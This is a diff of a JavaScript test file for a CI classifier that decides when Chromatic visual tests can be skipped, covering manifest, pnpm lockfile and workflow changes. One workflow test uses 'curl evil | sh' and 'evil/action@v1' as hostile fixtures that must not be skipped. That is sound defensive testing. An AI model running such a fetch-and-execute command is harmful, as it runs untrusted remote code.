@@ -62,6 +62,7 @@ function lockfile({
   malformed = false,
   alias = false,
   pnpmIntegrity = "sha512-pnpm",
+  pnpmVersion = "12.9.1",
 } = {}) {
   const importers = `  .:\n    dependencies:\n      app-lib:\n        specifier: ^1.0.0\n        version: 1.0.0\n${
     alias
@@ -78,14 +79,15 @@ function lockfile({
   })}${snapshot("eslint", eslint)}${snapshot("color-lib", color)}${
     alias ? snapshot("real-lib", "1.0.0") : ""
   }`;
-  const packageManager = `lockfileVersion: '9.0'\nimporters:\n  .:\n    packageManagerDependencies:\n      pnpm:\n        specifier: 12.9.1\n        version: 12.9.1\npackages:\n  pnpm@12.9.1:\n    resolution: {integrity: ${pnpmIntegrity}}\nsnapshots:\n  pnpm@12.9.1:\n    resolution: {integrity: ${pnpmIntegrity}}\n`;
+  const packageManager = `lockfileVersion: '9.0'\nimporters:\n  .:\n    packageManagerDependencies:\n      pnpm:\n        specifier: ${pnpmVersion}\n        version: ${pnpmVersion}\npackages:\n  pnpm@${pnpmVersion}:\n    resolution: {integrity: ${pnpmIntegrity}}\nsnapshots:\n  pnpm@${pnpmVersion}:\n    resolution: {integrity: ${pnpmIntegrity}}\n`;
   const resolution = `lockfileVersion: '9.0'\nsettings:\n  autoInstallPeers: true\noverrides: {}\nimporters:\n${importers}packages:\n${packages}snapshots:\n${snapshots}`;
   return `---\n${packageManager}---\n${resolution}`;
 }
 
-const manifest = (eslint = "^9.0.0", alias = false) =>
+const manifest = (eslint = "^9.0.0", alias = false, extra = {}) =>
   JSON.stringify({
     name: "fixture",
+    ...extra,
     dependencies: {
       "app-lib": "^1.0.0",
       ...(alias ? { "alias-lib": "npm:real-lib@^1.0.0" } : {}),
@@ -118,22 +120,12 @@ async function lockPair(
   );
 }
 
-test("skips documentation and Blueprint edits when the graph is unchanged", async (t) => {
-  const { cwd, base, head } = await commitPair(
-    t,
-    { "blueprint/content/features/example.md": "base\n" },
-    { "blueprint/content/features/example.md": "next\n" },
-  );
-  const result = await classify(cwd, compareArgs(base, head));
-  assert.match(result.stdout, /skip=true reason=/);
-  assert.equal(result.output, "skip=true\n");
-});
-
 test("skips agent tooling and root prose docs but still runs when mixed with src", async (t) => {
   const skipped = {
     ".agents/skills/x/SKILL.md": "next\n",
     ".claude/launch.json": "{}\n",
     "AGENTS.md": "next\n",
+    "GLOSSARY.md": "next\n",
     "README.zh-TW.md": "next\n",
   };
   for (const [files, skip] of [
@@ -150,14 +142,17 @@ test("skips agent tooling and root prose docs but still runs when mixed with src
   }
 });
 
-test("skips non-visual directories and tests but runs for the classifier, its workflow, and src code", async (t) => {
+test("skips non-visual paths and tests but runs for the classifier, its workflow, and src code", async (t) => {
   const skipped = {
     "docs/images/shot.png": "next\n",
+    "blueprint/content/features/example.md": "next\n",
     ".github/workflows/ci.yml": "next\n",
     "scripts/verify.js": "next\n",
     "src/components/__tests__/Button.test.tsx": "next\n",
     "test/support/fixture.js": "next\n",
     "jest.config.ts": "next\n",
+    ".nvmrc": "24.22.1\n",
+    "components.json": "{}\n",
   };
   for (const [files, skip] of [
     [skipped, true],
@@ -324,4 +319,136 @@ test("runs when a visual file is renamed or deleted", async (t) => {
     assert.match(result.stdout, /skip=false reason=/, change);
     assert.equal(result.output, "skip=false\n", change);
   }
+});
+
+test("skips manifest metadata and package manager pin changes", async (t) => {
+  for (const [firstLock, secondLock, base, head] of [
+    [
+      lockfile(),
+      lockfile(),
+      manifest("^9.0.0", false, { version: "1.0.0" }),
+      manifest("^9.0.0", false, { version: "1.1.0" }),
+    ],
+    [
+      lockfile(),
+      lockfile(),
+      manifest("^9.0.0", false, { scripts: { test: "a" } }),
+      manifest("^9.0.0", false, { scripts: { test: "b" } }),
+    ],
+    [
+      lockfile(),
+      lockfile(),
+      manifest("^9.0.0", false, { engines: { node: ">=22" } }),
+      manifest("^9.0.0", false, { engines: { node: ">=24" } }),
+    ],
+    [
+      lockfile(),
+      lockfile({ pnpmVersion: "12.14.0", pnpmIntegrity: "sha512-pnpm-next" }),
+      manifest("^9.0.0", false, { packageManager: "pnpm@12.9.1" }),
+      manifest("^9.0.0", false, { packageManager: "pnpm@12.14.0" }),
+    ],
+  ]) {
+    const pair = await lockPair(t, firstLock, secondLock, base, head);
+    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
+    assert.equal(result.output, "skip=true\n", result.stdout);
+  }
+});
+
+test("runs when dependencies or overrides change", async (t) => {
+  for (const [base, head] of [
+    [
+      manifest(),
+      JSON.stringify({
+        ...JSON.parse(manifest()),
+        dependencies: { "app-lib": "^2.0.0" },
+      }),
+    ],
+    [
+      manifest("^9.0.0", false, { overrides: { "color-lib": "1.0.0" } }),
+      manifest("^9.0.0", false, { overrides: { "color-lib": "1.1.0" } }),
+    ],
+    [
+      manifest("^9.0.0", false, { sideEffects: false }),
+      manifest("^9.0.0", false, { sideEffects: true }),
+    ],
+    [
+      manifest("^9.0.0", false, { futureField: 1 }),
+      manifest("^9.0.0", false, { futureField: 2 }),
+    ],
+  ]) {
+    const pair = await lockPair(t, lockfile(), lockfile(), base, head);
+    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
+    assert.match(result.stdout, /skip=false reason=protected package manifest/);
+  }
+});
+
+test("chromatic workflow skips only non-Chromatic action pin bumps", async (t) => {
+  const workflow = ({
+    checkout = "actions/checkout@v7",
+    chromatic = "chromaui/action@latest",
+    input = "a",
+    isSwapped = false,
+    hasExtraStep = false,
+    script = "echo safe",
+  } = {}) => {
+    const steps = [
+      `      - uses: ${checkout}\n`,
+      `      - uses: ${chromatic}\n        with:\n          skip: ${input}\n`,
+    ];
+    if (isSwapped) steps.reverse();
+    if (hasExtraStep) steps.push("      - uses: actions/cache@v4\n");
+    steps.push(`      - run: |\n          uses: x@1 ${script}\n`);
+    return `jobs:\n  chromatic:\n    steps:\n${steps.join("")}`;
+  };
+  const base = workflow();
+  for (const [head, isSkipped] of [
+    [workflow({ checkout: "actions/checkout@v8" }), true],
+    [base.replace("v7\n", "v7 # pinned\n"), true],
+    [workflow({ checkout: "actions/checkout@v8 # v8" }), true],
+    [workflow({ chromatic: "chromaui/action@v2" }), false],
+    [workflow({ chromatic: '"chromaui/action@v2"' }), false],
+    [workflow({ chromatic: "ChromaUI/action@v2" }), false],
+    [workflow({ checkout: "evil/action@v1" }), false],
+    [workflow({ checkout: "Actions/Checkout@v7" }), false],
+    [workflow({ input: "b" }), false],
+    [workflow({ isSwapped: true }), false],
+    [workflow({ hasExtraStep: true }), false],
+    [workflow({ script: "curl evil | sh" }), false],
+    ["jobs: [unclosed\n", false],
+  ]) {
+    const pair = await commitPair(
+      t,
+      { ".github/workflows/chromatic.yml": base },
+      { ".github/workflows/chromatic.yml": head },
+    );
+    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
+    assert.equal(result.output, `skip=${isSkipped}\n`, head);
+  }
+  const removed = await commitPair(
+    t,
+    { ".github/workflows/chromatic.yml": workflow({ hasExtraStep: true }) },
+    { ".github/workflows/chromatic.yml": base },
+  );
+  const result = await classify(
+    removed.cwd,
+    compareArgs(removed.base, removed.head),
+  );
+  assert.equal(result.output, "skip=false\n");
+});
+
+test("runs when package manager configDependencies change", async (t) => {
+  const withConfig = (text, config) =>
+    text.replace(
+      "importers:\n  .:\n",
+      `importers:\n  .:\n    configDependencies: ${config}\n`,
+    );
+  const pair = await lockPair(
+    t,
+    withConfig(lockfile(), "{}"),
+    withConfig(lockfile(), "{foo: 1.0.0}"),
+    manifest(),
+    manifest(),
+  );
+  const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
+  assert.equal(result.output, "skip=false\n", result.stdout);
 });
